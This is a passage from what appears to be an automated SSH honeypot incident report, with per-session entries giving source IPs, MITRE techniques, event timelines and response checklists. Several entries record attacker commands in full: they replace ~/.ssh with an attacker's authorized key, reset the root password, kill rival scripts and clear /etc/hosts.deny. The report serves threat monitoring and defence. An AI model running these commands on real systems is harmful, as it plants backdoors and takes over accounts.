| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:04:45` | `cowrie.session.connect` |
| `2026-04-19 06:04:45` | `cowrie.client.version` |
| `2026-04-19 06:04:45` | `cowrie.client.kex` |
| `2026-04-19 06:04:47` | `cowrie.login.success` |
| `2026-04-19 06:04:48` | `cowrie.session.params` |
| `2026-04-19 06:04:48` | `cowrie.command.input` |
| `2026-04-19 06:04:48` | `cowrie.command.failed` |
| `2026-04-19 06:04:48` | `cowrie.log.closed` |
| `2026-04-19 06:04:48` | `cowrie.session.params` |
| `2026-04-19 06:04:48` | `cowrie.command.input` |
| `2026-04-19 06:04:49` | `cowrie.session.file_download` |
| `2026-04-19 06:04:49` | `cowrie.log.closed` |
| `2026-04-19 06:04:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.18.113[.]233` to AbuseIPDB if not already reported
- [ ] Block `14.18.113[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c649256a438

| Field | Detail |
|---|---|
| **Source IP** | `14.18.113[.]233` |
| **First Seen** | 2026-04-19 06:04 |
| **Last Seen** | 2026-04-19 06:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:04:55` | `cowrie.session.connect` |
| `2026-04-19 06:04:55` | `cowrie.client.version` |
| `2026-04-19 06:04:55` | `cowrie.client.kex` |
| `2026-04-19 06:04:57` | `cowrie.login.success` |
| `2026-04-19 06:04:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.18.113[.]233` to AbuseIPDB if not already reported
- [ ] Block `14.18.113[.]233` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a98ccef18333

| Field | Detail |
|---|---|
| **Source IP** | `14.18.113[.]233` |
| **First Seen** | 2026-04-19 06:05 |
| **Last Seen** | 2026-04-19 06:05 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:L2pE4IBh8cr7"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:05:10` | `cowrie.session.connect` |
| `2026-04-19 06:05:10` | `cowrie.client.version` |
| `2026-04-19 06:05:11` | `cowrie.client.kex` |
| `2026-04-19 06:05:12` | `cowrie.login.success` |
| `2026-04-19 06:05:13` | `cowrie.session.params` |
| `2026-04-19 06:05:13` | `cowrie.command.input` |
| `2026-04-19 06:05:13` | `cowrie.command.failed` |
| `2026-04-19 06:05:14` | `cowrie.log.closed` |
| `2026-04-19 06:05:14` | `cowrie.session.params` |
| `2026-04-19 06:05:14` | `cowrie.command.input` |
| `2026-04-19 06:05:15` | `cowrie.session.file_download` |
| `2026-04-19 06:05:15` | `cowrie.log.closed` |
| `2026-04-19 06:05:27` | `cowrie.session.params` |
| `2026-04-19 06:05:27` | `cowrie.command.input` |
| `2026-04-19 06:05:28` | `cowrie.log.closed` |
| `2026-04-19 06:05:28` | `cowrie.session.params` |
| `2026-04-19 06:05:28` | `cowrie.command.input` |
| `2026-04-19 06:05:29` | `cowrie.log.closed` |
| `2026-04-19 06:05:30` | `cowrie.session.params` |
| `2026-04-19 06:05:30` | `cowrie.command.input` |
| `2026-04-19 06:05:30` | `cowrie.session.file_download` |
| `2026-04-19 06:05:30` | `cowrie.log.closed` |
| `2026-04-19 06:05:31` | `cowrie.session.params` |
| `2026-04-19 06:05:31` | `cowrie.command.input` |
| `2026-04-19 06:05:32` | `cowrie.log.closed` |
| `2026-04-19 06:05:32` | `cowrie.session.params` |
| `2026-04-19 06:05:32` | `cowrie.command.input` |
| `2026-04-19 06:05:33` | `cowrie.log.closed` |
| `2026-04-19 06:05:34` | `cowrie.session.params` |
| `2026-04-19 06:05:34` | `cowrie.command.input` |
| `2026-04-19 06:05:34` | `cowrie.command.input` |
| `2026-04-19 06:05:34` | `cowrie.log.closed` |
| `2026-04-19 06:05:35` | `cowrie.session.params` |
| `2026-04-19 06:05:35` | `cowrie.command.input` |
| `2026-04-19 06:05:35` | `cowrie.log.closed` |
| `2026-04-19 06:05:35` | `cowrie.session.params` |
| `2026-04-19 06:05:35` | `cowrie.command.input` |
| `2026-04-19 06:05:36` | `cowrie.log.closed` |
| `2026-04-19 06:05:36` | `cowrie.session.params` |
| `2026-04-19 06:05:36` | `cowrie.command.input` |
| `2026-04-19 06:05:36` | `cowrie.log.closed` |
| `2026-04-19 06:05:37` | `cowrie.session.params` |
| `2026-04-19 06:05:37` | `cowrie.command.input` |
| `2026-04-19 06:05:37` | `cowrie.log.closed` |
| `2026-04-19 06:05:38` | `cowrie.session.params` |
| `2026-04-19 06:05:38` | `cowrie.command.input` |
| `2026-04-19 06:05:38` | `cowrie.log.closed` |
| `2026-04-19 06:05:39` | `cowrie.session.params` |
| `2026-04-19 06:05:39` | `cowrie.command.input` |
| `2026-04-19 06:05:39` | `cowrie.log.closed` |
| `2026-04-19 06:05:40` | `cowrie.session.params` |
| `2026-04-19 06:05:40` | `cowrie.command.input` |
| `2026-04-19 06:05:40` | `cowrie.log.closed` |
| `2026-04-19 06:05:40` | `cowrie.session.params` |
| `2026-04-19 06:05:40` | `cowrie.command.input` |
| `2026-04-19 06:05:41` | `cowrie.log.closed` |
| `2026-04-19 06:05:41` | `cowrie.session.params` |
| `2026-04-19 06:05:41` | `cowrie.command.input` |
| `2026-04-19 06:05:42` | `cowrie.log.closed` |
| `2026-04-19 06:05:42` | `cowrie.session.params` |
| `2026-04-19 06:05:42` | `cowrie.command.input` |
| `2026-04-19 06:05:43` | `cowrie.log.closed` |
| `2026-04-19 06:05:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.18.113[.]233` to AbuseIPDB if not already reported
- [ ] Block `14.18.113[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b6ceffb1a56

| Field | Detail |
|---|---|
| **Source IP** | `14.18.113[.]233` |
| **First Seen** | 2026-04-19 06:07 |
| **Last Seen** | 2026-04-19 06:07 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:07:46` | `cowrie.session.connect` |
| `2026-04-19 06:07:46` | `cowrie.client.version` |
| `2026-04-19 06:07:47` | `cowrie.client.kex` |
| `2026-04-19 06:07:48` | `cowrie.login.success` |
| `2026-04-19 06:07:48` | `cowrie.session.params` |
| `2026-04-19 06:07:48` | `cowrie.command.input` |
| `2026-04-19 06:07:48` | `cowrie.command.failed` |
| `2026-04-19 06:07:49` | `cowrie.log.closed` |
| `2026-04-19 06:07:49` | `cowrie.session.params` |
| `2026-04-19 06:07:49` | `cowrie.command.input` |
| `2026-04-19 06:07:50` | `cowrie.session.file_download` |
| `2026-04-19 06:07:50` | `cowrie.log.closed` |
| `2026-04-19 06:07:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.18.113[.]233` to AbuseIPDB if not already reported
- [ ] Block `14.18.113[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9aa2550dad84

| Field | Detail |
|---|---|
| **Source IP** | `193.123.245[.]198` |
| **First Seen** | 2026-04-19 06:07 |
| **Last Seen** | 2026-04-19 06:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:07:48` | `cowrie.session.connect` |
| `2026-04-19 06:07:48` | `cowrie.client.version` |
| `2026-04-19 06:07:48` | `cowrie.client.kex` |
| `2026-04-19 06:07:48` | `cowrie.login.success` |
| `2026-04-19 06:07:49` | `cowrie.session.params` |
| `2026-04-19 06:07:49` | `cowrie.command.input` |
| `2026-04-19 06:07:49` | `cowrie.command.failed` |
| `2026-04-19 06:07:49` | `cowrie.log.closed` |
| `2026-04-19 06:07:49` | `cowrie.session.params` |
| `2026-04-19 06:07:49` | `cowrie.command.input` |
| `2026-04-19 06:07:49` | `cowrie.session.file_download` |
| `2026-04-19 06:07:49` | `cowrie.log.closed` |
| `2026-04-19 06:07:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.123.245[.]198` to AbuseIPDB if not already reported
- [ ] Block `193.123.245[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d79b9f19f1f2

| Field | Detail |
|---|---|
| **Source IP** | `193.123.245[.]198` |
| **First Seen** | 2026-04-19 06:07 |
| **Last Seen** | 2026-04-19 06:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:07:51` | `cowrie.session.connect` |
| `2026-04-19 06:07:51` | `cowrie.client.version` |
| `2026-04-19 06:07:52` | `cowrie.client.kex` |
| `2026-04-19 06:07:52` | `cowrie.login.success` |
| `2026-04-19 06:07:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.123.245[.]198` to AbuseIPDB if not already reported
- [ ] Block `193.123.245[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7147eb4e783

| Field | Detail |
|---|---|
| **Source IP** | `14.18.113[.]233` |
| **First Seen** | 2026-04-19 06:07 |
| **Last Seen** | 2026-04-19 06:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:07:56` | `cowrie.session.connect` |
| `2026-04-19 06:07:56` | `cowrie.client.version` |
| `2026-04-19 06:07:56` | `cowrie.client.kex` |
| `2026-04-19 06:07:57` | `cowrie.login.success` |
| `2026-04-19 06:07:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.18.113[.]233` to AbuseIPDB if not already reported
- [ ] Block `14.18.113[.]233` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-716f632424d6

| Field | Detail |
|---|---|
| **Source IP** | `210.14.142[.]89` |
| **First Seen** | 2026-04-19 06:08 |
| **Last Seen** | 2026-04-19 06:08 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:y41GYA6kXXlN"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:08:14` | `cowrie.session.connect` |
| `2026-04-19 06:08:14` | `cowrie.client.version` |
| `2026-04-19 06:08:15` | `cowrie.client.kex` |
| `2026-04-19 06:08:15` | `cowrie.login.success` |
| `2026-04-19 06:08:16` | `cowrie.session.params` |
| `2026-04-19 06:08:16` | `cowrie.command.input` |
| `2026-04-19 06:08:16` | `cowrie.command.failed` |
| `2026-04-19 06:08:16` | `cowrie.log.closed` |
| `2026-04-19 06:08:16` | `cowrie.session.params` |
| `2026-04-19 06:08:16` | `cowrie.command.input` |
| `2026-04-19 06:08:16` | `cowrie.session.file_download` |
| `2026-04-19 06:08:16` | `cowrie.log.closed` |
| `2026-04-19 06:08:29` | `cowrie.session.params` |
| `2026-04-19 06:08:29` | `cowrie.command.input` |
| `2026-04-19 06:08:29` | `cowrie.log.closed` |
| `2026-04-19 06:08:29` | `cowrie.session.params` |
| `2026-04-19 06:08:29` | `cowrie.command.input` |
| `2026-04-19 06:08:29` | `cowrie.log.closed` |
| `2026-04-19 06:08:30` | `cowrie.session.params` |
| `2026-04-19 06:08:30` | `cowrie.command.input` |
| `2026-04-19 06:08:30` | `cowrie.session.file_download` |
| `2026-04-19 06:08:30` | `cowrie.log.closed` |
| `2026-04-19 06:08:30` | `cowrie.session.params` |
| `2026-04-19 06:08:30` | `cowrie.command.input` |
| `2026-04-19 06:08:30` | `cowrie.log.closed` |
| `2026-04-19 06:08:31` | `cowrie.session.params` |
| `2026-04-19 06:08:31` | `cowrie.command.input` |
| `2026-04-19 06:08:31` | `cowrie.log.closed` |
| `2026-04-19 06:08:31` | `cowrie.session.params` |
| `2026-04-19 06:08:31` | `cowrie.command.input` |
| `2026-04-19 06:08:31` | `cowrie.command.input` |
| `2026-04-19 06:08:31` | `cowrie.log.closed` |
| `2026-04-19 06:08:32` | `cowrie.session.params` |
| `2026-04-19 06:08:32` | `cowrie.command.input` |
| `2026-04-19 06:08:32` | `cowrie.log.closed` |
| `2026-04-19 06:08:32` | `cowrie.session.params` |
| `2026-04-19 06:08:32` | `cowrie.command.input` |
| `2026-04-19 06:08:32` | `cowrie.log.closed` |
| `2026-04-19 06:08:33` | `cowrie.session.params` |
| `2026-04-19 06:08:33` | `cowrie.command.input` |
| `2026-04-19 06:08:33` | `cowrie.log.closed` |
| `2026-04-19 06:08:33` | `cowrie.session.params` |
| `2026-04-19 06:08:33` | `cowrie.command.input` |
| `2026-04-19 06:08:33` | `cowrie.log.closed` |
| `2026-04-19 06:08:34` | `cowrie.session.params` |
| `2026-04-19 06:08:34` | `cowrie.command.input` |
| `2026-04-19 06:08:34` | `cowrie.log.closed` |
| `2026-04-19 06:08:34` | `cowrie.session.params` |
| `2026-04-19 06:08:34` | `cowrie.command.input` |
| `2026-04-19 06:08:34` | `cowrie.log.closed` |
| `2026-04-19 06:08:35` | `cowrie.session.params` |
| `2026-04-19 06:08:35` | `cowrie.command.input` |
| `2026-04-19 06:08:35` | `cowrie.log.closed` |
| `2026-04-19 06:08:35` | `cowrie.session.params` |
| `2026-04-19 06:08:35` | `cowrie.command.input` |
| `2026-04-19 06:08:35` | `cowrie.log.closed` |
| `2026-04-19 06:08:36` | `cowrie.session.params` |
| `2026-04-19 06:08:36` | `cowrie.command.input` |
| `2026-04-19 06:08:36` | `cowrie.log.closed` |
| `2026-04-19 06:08:36` | `cowrie.session.params` |
| `2026-04-19 06:08:36` | `cowrie.command.input` |
| `2026-04-19 06:08:37` | `cowrie.log.closed` |
| `2026-04-19 06:08:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.14.142[.]89` to AbuseIPDB if not already reported
- [ ] Block `210.14.142[.]89` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cc1e8be0dd2

| Field | Detail |
|---|---|
| **Source IP** | `14.18.113[.]233` |
| **First Seen** | 2026-04-19 06:08 |
| **Last Seen** | 2026-04-19 06:09 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:plT3T2axBLf5"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:08:55` | `cowrie.session.connect` |
| `2026-04-19 06:08:55` | `cowrie.client.version` |
| `2026-04-19 06:08:55` | `cowrie.client.kex` |
| `2026-04-19 06:08:57` | `cowrie.login.success` |
| `2026-04-19 06:08:58` | `cowrie.session.params` |
| `2026-04-19 06:08:58` | `cowrie.command.input` |
| `2026-04-19 06:08:58` | `cowrie.command.failed` |
| `2026-04-19 06:08:58` | `cowrie.log.closed` |
| `2026-04-19 06:08:59` | `cowrie.session.params` |
| `2026-04-19 06:08:59` | `cowrie.command.input` |
| `2026-04-19 06:08:59` | `cowrie.session.file_download` |
| `2026-04-19 06:08:59` | `cowrie.log.closed` |
| `2026-04-19 06:09:08` | `cowrie.session.params` |
| `2026-04-19 06:09:08` | `cowrie.command.input` |
| `2026-04-19 06:09:09` | `cowrie.log.closed` |
| `2026-04-19 06:09:09` | `cowrie.session.params` |
| `2026-04-19 06:09:09` | `cowrie.command.input` |
| `2026-04-19 06:09:09` | `cowrie.log.closed` |
| `2026-04-19 06:09:10` | `cowrie.session.params` |
| `2026-04-19 06:09:10` | `cowrie.command.input` |
| `2026-04-19 06:09:10` | `cowrie.session.file_download` |
| `2026-04-19 06:09:10` | `cowrie.log.closed` |
| `2026-04-19 06:09:11` | `cowrie.session.params` |
| `2026-04-19 06:09:11` | `cowrie.command.input` |
| `2026-04-19 06:09:11` | `cowrie.log.closed` |
| `2026-04-19 06:09:12` | `cowrie.session.params` |
| `2026-04-19 06:09:12` | `cowrie.command.input` |
| `2026-04-19 06:09:12` | `cowrie.log.closed` |
| `2026-04-19 06:09:13` | `cowrie.session.params` |
| `2026-04-19 06:09:13` | `cowrie.command.input` |
| `2026-04-19 06:09:13` | `cowrie.command.input` |
| `2026-04-19 06:09:13` | `cowrie.log.closed` |
| `2026-04-19 06:09:14` | `cowrie.session.params` |
| `2026-04-19 06:09:14` | `cowrie.command.input` |
| `2026-04-19 06:09:14` | `cowrie.log.closed` |
| `2026-04-19 06:09:15` | `cowrie.session.params` |
| `2026-04-19 06:09:15` | `cowrie.command.input` |
| `2026-04-19 06:09:15` | `cowrie.log.closed` |
| `2026-04-19 06:09:15` | `cowrie.session.params` |
| `2026-04-19 06:09:15` | `cowrie.command.input` |
| `2026-04-19 06:09:16` | `cowrie.log.closed` |
| `2026-04-19 06:09:17` | `cowrie.session.params` |
| `2026-04-19 06:09:17` | `cowrie.command.input` |
| `2026-04-19 06:09:18` | `cowrie.log.closed` |
| `2026-04-19 06:09:18` | `cowrie.session.params` |
| `2026-04-19 06:09:18` | `cowrie.command.input` |
| `2026-04-19 06:09:18` | `cowrie.log.closed` |
| `2026-04-19 06:09:19` | `cowrie.session.params` |
| `2026-04-19 06:09:19` | `cowrie.command.input` |
| `2026-04-19 06:09:20` | `cowrie.log.closed` |
| `2026-04-19 06:09:20` | `cowrie.session.params` |
| `2026-04-19 06:09:20` | `cowrie.command.input` |
| `2026-04-19 06:09:21` | `cowrie.log.closed` |
| `2026-04-19 06:09:21` | `cowrie.session.params` |
| `2026-04-19 06:09:21` | `cowrie.command.input` |
| `2026-04-19 06:09:22` | `cowrie.log.closed` |
| `2026-04-19 06:09:22` | `cowrie.session.params` |
| `2026-04-19 06:09:22` | `cowrie.command.input` |
| `2026-04-19 06:09:22` | `cowrie.log.closed` |
| `2026-04-19 06:09:24` | `cowrie.session.params` |
| `2026-04-19 06:09:24` | `cowrie.command.input` |
| `2026-04-19 06:09:24` | `cowrie.log.closed` |
| `2026-04-19 06:09:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.18.113[.]233` to AbuseIPDB if not already reported
- [ ] Block `14.18.113[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83e53fe95dc3

| Field | Detail |
|---|---|
| **Source IP** | `14.18.113[.]233` |
| **First Seen** | 2026-04-19 06:09 |
| **Last Seen** | 2026-04-19 06:09 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:09:34` | `cowrie.session.connect` |
| `2026-04-19 06:09:34` | `cowrie.client.version` |
| `2026-04-19 06:09:34` | `cowrie.client.kex` |
